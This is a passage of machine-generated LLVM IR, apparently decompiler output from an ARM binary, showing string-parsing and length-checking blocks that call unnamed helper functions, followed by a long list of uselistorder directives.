  store i32 7, i32* @ip, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9c2c = load i32, i32* @r6, align 4
  %v1_9c2c = add i32 %v0_9c2c, 4
  %v2_9c2c = inttoptr i32 %v1_9c2c to i8*
  %v3_9c2c = load i8, i8* %v2_9c2c, align 1
  %v4_9c2c = zext i8 %v3_9c2c to i32
  store i32 %v4_9c2c, i32* @r3, align 4
  %v2_9c30 = icmp ugt i8 %v3_9c2c, 114
  store i1 %v2_9c30, i1* %cpsr_c.global-to-local, align 1
  %v7_9c30 = icmp eq i8 %v3_9c2c, 115
  store i1 %v7_9c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c30, label %bb213, label %.thread47

bb213:                                            ; preds = %dec_label_pc_9c20
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_9c20, %bb213
  %v3_9c40 = phi i32 [ 7, %dec_label_pc_9c20 ], [ 8, %bb213 ]
  %v1_9c44 = sub nsw i32 1, %v3_9c40
  %v1_9c48 = load i32, i32* @r7, align 4
  %v2_9c48 = add i32 %v1_9c48, %v1_9c44
  store i32 %v2_9c48, i32* @r2, align 4
  %v2_9c4c = add i32 %v3_9c40, %v0_9c2c
  store i32 %v2_9c4c, i32* @r1, align 4
  store i32 %v0_9c2c, i32* @r0, align 4
  %v3_9c54 = call i32 @function_10b20(i32 %v0_9c2c, i32 %v2_9c4c, i32 %v2_9c48)
  store i32 %v3_9c54, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_9c64 = load i32, i32* @r5, align 4
  %v1_9c64 = load i32, i32* @r4, align 4
  %v2_9c64 = add i32 %v1_9c64, %v0_9c64
  %v3_9c64 = inttoptr i32 %v2_9c64 to i8*
  %v4_9c64 = load i8, i8* %v3_9c64, align 1
  %v6_9c64 = zext i8 %v4_9c64 to i32
  store i32 %v6_9c64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9c68 = icmp eq i8 %v4_9c64, 0
  store i1 %v9_9c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c68, label %dec_label_pc_9ca8, label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %.thread47
  %v2_9c70 = icmp ugt i8 %v4_9c64, 46
  store i1 %v2_9c70, i1* %cpsr_c.global-to-local, align 1
  %v7_9c70 = icmp eq i8 %v4_9c64, 47
  store i1 %v7_9c70, i1* %cpsr_z.global-to-local, align 1
  %v1_9c74 = load i32, i32* @r6, align 4
  br i1 %v7_9c70, label %bb214, label %dec_label_pc_9c7c

bb214:                                            ; preds = %dec_label_pc_9c70
  store i32 %v1_9c74, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d28

dec_label_pc_9c7c:                                ; preds = %dec_label_pc_9c70
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9c8c

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9c8c
  %v2_9c84 = icmp ugt i8 %v4_9c98, 46
  store i1 %v2_9c84, i1* %cpsr_c.global-to-local, align 1
  %v7_9c84 = icmp eq i8 %v4_9c98, 47
  store i1 %v7_9c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c84, label %dec_label_pc_9d28, label %dec_label_pc_9c8c

dec_label_pc_9c8c:                                ; preds = %dec_label_pc_9c84, %dec_label_pc_9c7c
  %v0_9c8c = phi i32 [ %v1_9c8c, %dec_label_pc_9c84 ], [ 0, %dec_label_pc_9c7c ]
  %v1_9c8c = add i32 %v0_9c8c, 1
  store i32 %v1_9c8c, i32* %r1.global-to-local, align 4
  store i32 %v10_82b0, i32* @ip, align 4
  store i32 %v1_9c8c, i32* %stack_var_-44, align 4
  %v2_9c98 = add i32 %v1_9c8c, %v1_9c74
  %v3_9c98 = inttoptr i32 %v2_9c98 to i8*
  %v4_9c98 = load i8, i8* %v3_9c98, align 1
  %v6_9c98 = zext i8 %v4_9c98 to i32
  store i32 %v6_9c98, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c9c = icmp eq i8 %v4_9c98, 0
  store i1 %v2_9c9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9c98, i32* %r2.global-to-local, align 4
  br i1 %v2_9c9c, label %dec_label_pc_9ca8, label %dec_label_pc_9c84

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c8c, %.thread47, %dec_label_pc_9d28
  %v0_9ca8 = load i32, i32* @r6, align 4
  store i32 %v0_9ca8, i32* %r0.global-to-local, align 4
  %v1_9cac = inttoptr i32 %v0_9ca8 to i8*
  %v2_9cac = call i32 @function_f93c(i8* %v1_9cac)
  store i32 %v2_9cac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cb0 = icmp eq i32 %v2_9cac, 0
  store i1 %v2_9cb0, i1* %cpsr_z.global-to-local, align 1
  %tmp215 = icmp slt i32 %v2_9cac, 1
  br i1 %tmp215, label %dec_label_pc_9cc8, label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %dec_label_pc_9ca8
  %v0_9cb8 = load i32, i32* @r6, align 4
  store i32 %v0_9cb8, i32* %r0.global-to-local, align 4
  %v1_9cbc = inttoptr i32 %v0_9cb8 to i8*
  %v2_9cbc = call i32 @function_f93c(i8* %v1_9cbc)
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  %v2_9cc0 = icmp ugt i32 %v2_9cbc, 126
  store i1 %v2_9cc0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cc0 = icmp eq i32 %v2_9cbc, 127
  store i1 %v7_9cc0, i1* %cpsr_z.global-to-local, align 1
  %v7_9cc4 = icmp slt i32 %v2_9cbc, 128
  br i1 %v7_9cc4, label %dec_label_pc_9e88, label %dec_label_pc_9cc8

dec_label_pc_9cc8:                                ; preds = %dec_label_pc_9cb8, %dec_label_pc_9ca8, %dec_label_pc_9e88
  store i32 %v10_82b0, i32* @lr, align 4
  %v3_9ccc = load i32, i32* %stack_var_-44, align 4
  %v0_9cd0 = load i32, i32* @r6, align 4
  %v1_9cd0 = add i32 %v0_9cd0, 1
  store i32 %v1_9cd0, i32* @r5, align 4
  %v2_9cd4 = add i32 %v1_9cd0, %v3_9ccc
  store i32 %v2_9cd4, i32* %r0.global-to-local, align 4
  %v1_9cd8 = inttoptr i32 %v2_9cd4 to i8*
  %v2_9cd8 = call i32 @function_f93c(i8* %v1_9cd8)
  store i32 %v2_9cd8, i32* %r0.global-to-local, align 4
  %v2_9cdc = icmp ugt i32 %v2_9cd8, 254
  store i1 %v2_9cdc, i1* %cpsr_c.global-to-local, align 1
  %v7_9cdc = icmp eq i32 %v2_9cd8, 255
  store i1 %v7_9cdc, i1* %cpsr_z.global-to-local, align 1
  %v8_9ce0 = icmp sgt i32 %v2_9cd8, 255
  br i1 %v8_9ce0, label %dec_label_pc_98d8, label %dec_label_pc_9ce4

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9cc8
  %v0_9ce4 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ce8 = add i32 %v0_9ce4, 533
  store i32 %v1_9ce8, i32* @r4, align 4
  store i32 %v1_9ce8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9cf4 = call i32 @function_f9d0(i32 %v1_9ce8, i32 255)
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9cfc = load i32, i32* %stack_var_-44, align 4
  %v0_9d00 = load i32, i32* @r5, align 4
  %v2_9d00 = add i32 %v0_9d00, %v3_9cfc
  store i32 %v2_9d00, i32* %r0.global-to-local, align 4
  %v1_9d04 = inttoptr i32 %v2_9d00 to i8*
  %v2_9d04 = call i32 @function_f93c(i8* %v1_9d04)
  store i32 %v2_9d04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9d08 = icmp eq i32 %v2_9d04, 0
  store i1 %v2_9d08, i1* %cpsr_z.global-to-local, align 1
  %tmp216 = icmp slt i32 %v2_9d04, 1
  br i1 %tmp216, label %dec_label_pc_98d8, label %dec_label_pc_9d10

dec_label_pc_9d10:                                ; preds = %dec_label_pc_9ce4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v3_9d14 = load i32, i32* %stack_var_-44, align 4
  %v0_9d18 = load i32, i32* @r4, align 4
  store i32 %v0_9d18, i32* @r0, align 4
  %v0_9d1c = load i32, i32* @r5, align 4
  %v2_9d1c = add i32 %v0_9d1c, %v3_9d14
  store i32 %v2_9d1c, i32* %r1.global-to-local, align 4
  %v2_9d20 = inttoptr i32 %v0_9d18 to i8*
  %v3_9d20 = call i32 @function_f964(i8* %v2_9d20, i32 %v2_9d1c)
  store i32 %v3_9d20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98d8

dec_label_pc_9d28:                                ; preds = %dec_label_pc_9c84, %bb214
  %v2_9d2c = phi i32 [ %v1_9c74, %bb214 ], [ %v2_9c98, %dec_label_pc_9c84 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d2c = inttoptr i32 %v2_9d2c to i8*
  store i8 0, i8* %v3_9d2c, align 1
  br label %dec_label_pc_9ca8

dec_label_pc_9d34:                                ; preds = %dec_label_pc_9858
  %v1_9d34 = add i32 %v0_9d34, 1
  store i32 %v1_9d34, i32* %ip.global-to-local, align 4
  %v2_9d38 = add i32 %v0_9858, %v1_9d34
  store i32 %v2_9d38, i32* %r4.global-to-local, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i32 %v2_9d38, i32* %r0.global-to-local, align 4
  store i32 %v1_9d34, i32* %stack_var_-44, align 4
  %v1_9d48 = inttoptr i32 %v2_9d38 to i8*
  %v2_9d48 = call i32 @function_f93c(i8* %v1_9d48)
  store i32 %v2_9d48, i32* %r0.global-to-local, align 4
  %v0_9d4c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d4c = add i32 %v0_9d4c, %v2_9d48
  store i32 %v2_9d4c, i32* @r4, align 4
  %v1_9d50 = add i32 %v2_9d4c, -1
  %v2_9d50 = inttoptr i32 %v1_9d50 to i8*
  %v3_9d50 = load i8, i8* %v2_9d50, align 1
  %v4_9d50 = zext i8 %v3_9d50 to i32
  store i32 %v4_9d50, i32* %r3.global-to-local, align 4
  %v2_9d54 = icmp ugt i8 %v3_9d50, 33
  store i1 %v2_9d54, i1* %cpsr_c.global-to-local, align 1
  %v7_9d54 = icmp eq i8 %v3_9d50, 34
  store i1 %v7_9d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d54, label %dec_label_pc_9d5c, label %dec_label_pc_9864

dec_label_pc_9d5c:                                ; preds = %dec_label_pc_9d34
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9d60 = load i32, i32* %stack_var_-44, align 4
  %v0_9d64 = load i32, i32* @r5, align 4
  %v2_9d64 = add i32 %v0_9d64, %v3_9d60
  store i32 %v2_9d64, i32* %r4.global-to-local, align 4
  store i32 %v2_9d64, i32* %r0.global-to-local, align 4
  %v1_9d6c = inttoptr i32 %v2_9d64 to i8*
  %v2_9d6c = call i32 @function_f93c(i8* %v1_9d6c)
  store i32 %v2_9d6c, i32* %r0.global-to-local, align 4
  %v2_9d70 = add i32 %v2_9d64, %v2_9d6c
  store i32 %v2_9d70, i32* @r4, align 4
  %v0_9d74 = load i32, i32* @r6, align 4
  %v1_9d74 = trunc i32 %v0_9d74 to i8
  %v3_9d74 = add i32 %v2_9d70, -1
  %v4_9d74 = inttoptr i32 %v3_9d74 to i8*
  store i8 %v1_9d74, i8* %v4_9d74, align 1
  br label %dec_label_pc_9864

dec_label_pc_9d7c:                                ; preds = %dec_label_pc_98cc
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9d80 = load i32, i32* %stack_var_-44, align 4
  %v0_9d84 = load i32, i32* @r6, align 4
  %v1_9d84 = add i32 %v0_9d84, 1
  store i32 %v1_9d84, i32* @r5, align 4
  %v2_9d88 = add i32 %v1_9d84, %v3_9d80
  store i32 %v2_9d88, i32* %r0.global-to-local, align 4
  %v1_9d8c = inttoptr i32 %v2_9d88 to i8*
  %v2_9d8c = call i32 @function_f93c(i8* %v1_9d8c)
  store i32 %v2_9d8c, i32* %r0.global-to-local, align 4
  %v2_9d90 = icmp ugt i32 %v2_9d8c, 254
  store i1 %v2_9d90, i1* %cpsr_c.global-to-local, align 1
  %v7_9d90 = icmp eq i32 %v2_9d8c, 255
  store i1 %v7_9d90, i1* %cpsr_z.global-to-local, align 1
  %v8_9d94 = icmp sgt i32 %v2_9d8c, 255
  br i1 %v8_9d94, label %dec_label_pc_98d8, label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d7c
  %v0_9d98 = load i32, i32* %sb.global-to-local, align 4
  %v1_9d9c = add i32 %v0_9d98, 533
  store i32 %v1_9d9c, i32* @r4, align 4
  store i32 %v1_9d9c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9da8 = call i32 @function_f9d0(i32 %v1_9d9c, i32 255)
  store i32 %v10_82b0, i32* @ip, align 4
  %v3_9db0 = load i32, i32* %stack_var_-44, align 4
  %v0_9db4 = load i32, i32* @r5, align 4
  %v2_9db4 = add i32 %v0_9db4, %v3_9db0
  store i32 %v2_9db4, i32* %r0.global-to-local, align 4
  %v1_9db8 = inttoptr i32 %v2_9db4 to i8*
  %v2_9db8 = call i32 @function_f93c(i8* %v1_9db8)
  store i32 %v2_9db8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9dbc = icmp eq i32 %v2_9db8, 0
  store i1 %v2_9dbc, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v2_9db8, 1
  br i1 %tmp217, label %dec_label_pc_98d8, label %dec_label_pc_9dc4

dec_label_pc_9dc4:                                ; preds = %dec_label_pc_9d98
  store i32 %v10_82b0, i32* @lr, align 4
  %v3_9dc8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dcc = load i32, i32* @r4, align 4
  store i32 %v0_9dcc, i32* @r0, align 4
  %v0_9dd0 = load i32, i32* @r5, align 4
  %v2_9dd0 = add i32 %v0_9dd0, %v3_9dc8
  store i32 %v2_9dd0, i32* %r1.global-to-local, align 4
  %v2_9dd4 = inttoptr i32 %v0_9dcc to i8*
  %v3_9dd4 = call i32 @function_f964(i8* %v2_9dd4, i32 %v2_9dd0)
  store i32 %v3_9dd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98d8

dec_label_pc_9ddc:                                ; preds = %dec_label_pc_8480
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9de0 = call i32 @function_f0ac(i32 50)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v3_9dec = call i32 @function_efe8(i32 50, i32* null)
  store i32 %v3_9dec, i32* %r1.global-to-local, align 4
  %v0_9df4 = load i32, i32* @r5, align 4
  %v1_9df4 = add i32 %v0_9df4, 20
  store i32 %v1_9df4, i32* @r0, align 4
  %v2_9df8 = inttoptr i32 %v1_9df4 to i8*
  %v3_9df8 = call i32 @function_f964(i8* %v2_9df8, i32 %v3_9dec)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9e00 = call i32 @function_f00c(i32 50)
  store i32 %v1_9e00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9e04:                                ; preds = %dec_label_pc_8480, %dec_label_pc_9ef4, %dec_label_pc_9ec8, %dec_label_pc_9e9c, %dec_label_pc_9e5c, %dec_label_pc_9ddc
  store i32 %v0_83cc, i32* @r0, align 4
  %v0_9e08 = load i32, i32* @r8, align 4
  store i32 %v0_9e08, i32* %r1.global-to-local, align 4
  %v2_9e0c = inttoptr i32 %v0_83cc to i8*
  %v3_9e0c = call i32 @function_f964(i8* %v2_9e0c, i32 %v0_9e08)
  store i32 %v3_9e0c, i32* %r0.global-to-local, align 4
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  %v0_9e14 = load i32, i32* %fp.global-to-local, align 4
  %v1_9e14 = add i32 %v0_9e14, 1
  store i32 %v1_9e14, i32* %fp.global-to-local, align 4
  %v0_9e18 = load i32, i32* @r5, align 4
  %v3_9e1c = icmp uge i32 %v1_9e14, %v0_835c
  store i1 %v3_9e1c, i1* %cpsr_c.global-to-local, align 1
  %v9_9e1c = icmp eq i32 %v1_9e14, %v0_835c
  store i1 %v9_9e1c, i1* %cpsr_z.global-to-local, align 1
  %v1_9e20 = add i32 %v0_9e18, 3140
  store i32 %v1_9e20, i32* @r5, align 4
  br i1 %v9_9e1c, label %dec_label_pc_9e28, label %dec_label_pc_838c

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e04
  %v0_9e38 = load i32, i32* @r7, align 4
  %v1_9e38 = and i32 %v0_9e38, 128
  %v2_9e38 = icmp ne i32 %v1_9e38, 0
  store i1 %v2_9e38, i1* %cpsr_c.global-to-local, align 1
  %v3_9e38 = udiv i32 %v0_9e38, 256
  %v1_9e3c = add i32 %v2_8370, 1452
  store i32 %v1_9e3c, i32* %r3.global-to-local, align 4
  %v2_9e40 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e40, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_84ec.preheader

dec_label_pc_9e5c:                                ; preds = %dec_label_pc_8480
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e60 = call i32 @function_f0ac(i32 51)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v3_9e6c = call i32 @function_efe8(i32 51, i32* null)
  store i32 %v3_9e6c, i32* %r1.global-to-local, align 4
  %v0_9e74 = load i32, i32* @r5, align 4
  %v1_9e74 = add i32 %v0_9e74, 20
  store i32 %v1_9e74, i32* @r0, align 4
  %v2_9e78 = inttoptr i32 %v1_9e74 to i8*
  %v3_9e78 = call i32 @function_f964(i8* %v2_9e78, i32 %v3_9e6c)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e80 = call i32 @function_f00c(i32 51)
  store i32 %v1_9e80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9e88:                                ; preds = %dec_label_pc_9cb8
  %v0_9e88 = load i32, i32* %sb.global-to-local, align 4
  %v0_9e8c = load i32, i32* @r6, align 4
  store i32 %v0_9e8c, i32* %r1.global-to-local, align 4
  %v1_9e90 = add i32 %v0_9e88, 789
  store i32 %v1_9e90, i32* @r0, align 4
  %v2_9e94 = inttoptr i32 %v1_9e90 to i8*
  %v3_9e94 = call i32 @function_f964(i8* %v2_9e94, i32 %v0_9e8c)
  store i32 %v3_9e94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cc8

dec_label_pc_9e9c:                                ; preds = %dec_label_pc_8480
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9ea0 = call i32 @function_f0ac(i32 48)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v3_9eac = call i32 @function_efe8(i32 48, i32* null)
  store i32 %v3_9eac, i32* %r1.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r5, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 20
  store i32 %v1_9eb4, i32* @r0, align 4
  %v2_9eb8 = inttoptr i32 %v1_9eb4 to i8*
  %v3_9eb8 = call i32 @function_f964(i8* %v2_9eb8, i32 %v3_9eac)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9ec0 = call i32 @function_f00c(i32 48)
  store i32 %v1_9ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9ec8:                                ; preds = %dec_label_pc_8480
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9ecc = call i32 @function_f0ac(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9ed8 = call i32 @function_efe8(i32 47, i32* null)
  store i32 %v3_9ed8, i32* %r1.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r5, align 4
  %v1_9ee0 = add i32 %v0_9ee0, 20
  store i32 %v1_9ee0, i32* @r0, align 4
  %v2_9ee4 = inttoptr i32 %v1_9ee0 to i8*
  %v3_9ee4 = call i32 @function_f964(i8* %v2_9ee4, i32 %v3_9ed8)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9eec = call i32 @function_f00c(i32 47)
  store i32 %v1_9eec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9ef4:                                ; preds = %dec_label_pc_8480
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9ef8 = call i32 @function_f0ac(i32 49)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v3_9f04 = call i32 @function_efe8(i32 49, i32* null)
  store i32 %v3_9f04, i32* %r1.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  %v1_9f0c = add i32 %v0_9f0c, 20
  store i32 %v1_9f0c, i32* @r0, align 4
  %v2_9f10 = inttoptr i32 %v1_9f0c to i8*
  %v3_9f10 = call i32 @function_f964(i8* %v2_9f10, i32 %v3_9f04)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9f18 = call i32 @function_f00c(i32 49)
  store i32 %v1_9f18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

; uselistorder directives
  uselistorder i32 %v2_9e40, { 1, 0 }
  uselistorder i32 %v1_9e3c, { 1, 0 }
  uselistorder i32 %v0_9e38, { 0, 2, 1 }
  uselistorder i32 %v1_9e20, { 1, 0 }
  uselistorder i32 %v1_9d34, { 1, 0, 2 }
  uselistorder i8 %v4_9c98, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9c8c, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9c84, { 1, 0 }
  uselistorder i32 %v1_9c74, { 1, 0, 2 }
  uselistorder i1 %v7_9c70, { 1, 0 }
  uselistorder i1 %v9_9c68, { 1, 0 }
  uselistorder i32 %v0_9c2c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9b8c, { 1, 0 }
  uselistorder i32 %v2_9b68, { 1, 0, 2 }
  uselistorder i32 %v1_9b60, { 1, 0, 2 }
  uselistorder i32 %v1_9ae8, { 0, 2, 1 }
  uselistorder i32 %v0_9ae8, { 0, 2, 1 }
  uselistorder i32 %v2_9a5c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i8 %v4_9a34, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9a28, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9a20, { 1, 0 }
  uselistorder i32 %v1_9a10, { 1, 0, 2 }
  uselistorder i1 %v7_9a0c, { 1, 0 }
  uselistorder i32 %v0_99cc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_9990, { 2, 0, 1, 3 }
  uselistorder i32 %v2_9974, { 1, 0, 2 }
  uselistorder i32 %v4_996c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9894, { 1, 0 }
  uselistorder i32 %v0_9858, { 1, 0 }
  uselistorder i32 %v0_9d34, { 1, 0 }
  uselistorder i1 %v7_9814, { 1, 0 }
  uselistorder i32 %v0_97fc, { 1, 0 }
  uselistorder i32 %v2_97ec, { 1, 0, 2 }
  uselistorder i32 %v1_97b8, { 1, 0 }
  uselistorder i32 %v0_97b8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9750, { 1, 0 }
  uselistorder i32 %v5_974c, { 1, 3, 6, 4, 5, 2, 0, 7, 8 }
  uselistorder i32 %v2_9734.v4_971c, { 1, 0, 2 }
  uselistorder i1 %v7_96f8, { 1, 0 }
  uselistorder i32 %v1_95d8, { 1, 0, 2 }
  uselistorder i32 %v1_95d0, { 1, 0 }
  uselistorder i1 %v7_95b8, { 1, 0 }
  uselistorder i32 %v5_95b4, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_959c.v4_9584, { 1, 0, 2 }
  uselistorder i1 %v7_9564, { 1, 0 }
  uselistorder i32 %v0_94cc, { 1, 0 }
  uselistorder i32 %v0_94b4, { 1, 0 }
  uselistorder i32 %v0_94b8, { 1, 0 }
  uselistorder i32 %v1_9490, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_945c, { 1, 0 }
  uselistorder i1 %v7_9424, { 0, 2, 1 }
  uselistorder i32 %v1_9448, { 1, 0 }
  uselistorder i32 %v3_9440, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_9434, { 1, 0 }
  uselistorder i1 %v7_93a8, { 1, 0 }
  uselistorder i32 %v5_93a4, { 4, 3, 1, 2, 5, 0, 6, 7 }
  uselistorder i32 %v2_938c, { 1, 0, 2 }
  uselistorder i32 %v2_9388, { 1, 0, 2 }
  uselistorder i32 %v1_9374, { 0, 2, 1 }
  uselistorder i32 %v4_936c, { 1, 2, 0, 3 }
  uselistorder i1 %v7_933c, { 1, 0 }
  uselistorder i1 %v7_92d4, { 1, 0 }
  uselistorder i32 %v5_92d0, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_92b8.v4_92a0, { 1, 0, 2 }
  uselistorder i1 %v7_9270, { 1, 0 }
  uselistorder i1 %v7_91fc, { 1, 0 }
  uselistorder i32 %v5_91f8, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_91e0.v4_91c8, { 1, 0, 2 }
  uselistorder i1 %v7_91a4, { 1, 0 }
  uselistorder i1 %v7_9124, { 1, 0 }
  uselistorder i32 %v5_9120, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9108.v4_90f0, { 1, 0, 2 }
  uselistorder i1 %v7_90d0, { 1, 0 }
  uselistorder i1 %v7_90a4, { 1, 0 }
  uselistorder i1 %v7_907c, { 1, 0 }
  uselistorder i32 %v0_9038, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9008, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_8fa0, { 1, 0 }
  uselistorder i32 %v2_8f94, { 1, 0 }
  uselistorder i32 %v1_8f94, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v3_8f6c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8f4c, { 1, 0 }
  uselistorder i32 %v2_8f40, { 1, 0 }
  uselistorder i32 %v1_8f40, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f34, { 1, 0 }
  uselistorder i32 %v3_8f18, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8ed4, { 1, 0 }
  uselistorder i32 %v5_8eb0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8e98, { 1, 0 }
  uselistorder i32 %v3_8e7c, { 1, 0 }
  uselistorder i32 %v0_8e38, { 1, 0 }
  uselistorder i32 %v3_8e04, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e04, { 1, 0 }
  uselistorder i32 %v0_8e04, { 1, 0 }
  uselistorder i32 %v3_8dec, { 1, 0, 2 }
  uselistorder i32 %v0_8de0, { 1, 2, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i1 %v7_8d5c, { 1, 0 }
  uselistorder i32 %v4_8d50, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d20, { 1, 0 }
  uselistorder i32 %v2_8d10, { 1, 0 }
  uselistorder i32 %v2_8d04, { 1, 0 }
  uselistorder i32 %v1_8d04, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8cf8, { 1, 0 }
  uselistorder i32 %v3_8cdc, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8cc0, { 0, 2, 1 }
  uselistorder i32 %v2_8c98, { 1, 0 }
  uselistorder i32 %v1_8c98, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8c98, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8c84, { 1, 0 }
  uselistorder i32 %v3_8c64, { 1, 0, 2 }
  uselistorder i32 %v1_8bc8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8a6c, { 1, 0 }
  uselistorder i32 %v3_884c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_87f8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_87f4, { 1, 0 }
  uselistorder i32 %v3_87e8, { 2, 0, 1 }
  uselistorder i1 %v7_87d4, { 1, 0 }
  uselistorder i32 %v3_87cc, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87a4, { 1, 0 }
  uselistorder i1 %v7_879c, { 1, 0 }
  uselistorder i32 %v3_8780, { 1, 0 }
  uselistorder i32 %v1_8760, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8760, { 0, 2, 1 }
  uselistorder i32 %v2_875c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8748, { 1, 0, 2 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v2_86e8, { 1, 0 }
  uselistorder i32 %v1_86e8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_86dc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_86e8, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_86cc, { 1, 0 }
